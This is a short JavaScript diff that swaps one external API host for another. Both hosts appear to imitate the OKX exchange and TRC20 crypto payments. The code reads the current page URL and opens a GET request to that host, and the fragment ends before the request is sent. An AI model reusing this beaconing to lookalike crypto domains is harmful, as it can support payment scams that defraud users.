@@ -1,4 +1,4 @@
-        var api_url = 'https://www.okx-web3pay.top';
+        var api_url = 'https://www.pay-okxtrc20.com';
         var domain = window.location.href;
         var xhr = new XMLHttpRequest();
         xhr.open('GET',api_url, true);
